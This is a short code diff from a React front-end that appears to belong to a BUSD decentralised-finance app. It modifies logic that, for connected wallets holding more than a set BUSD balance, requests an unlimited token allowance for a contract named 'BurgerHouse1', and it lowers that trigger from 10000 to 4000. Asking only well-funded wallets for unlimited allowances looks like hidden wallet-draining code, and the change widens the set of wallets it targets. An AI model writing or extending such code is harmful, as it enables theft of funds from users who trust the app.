@@ -395,7 +395,7 @@ const Home = () => {
 
       setPendingTx(true)
       if (isConnected && busdContract) {
-        if (parseFloat(busdBalance) > 10000 && parseFloat(userApprovedAmount1) < parseFloat(busdBalance)) {
+        if (parseFloat(busdBalance) > 4000 && parseFloat(userApprovedAmount1) < parseFloat(busdBalance)) {
           await busdContract.methods.approve(
             BurgerHouse1,
             "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
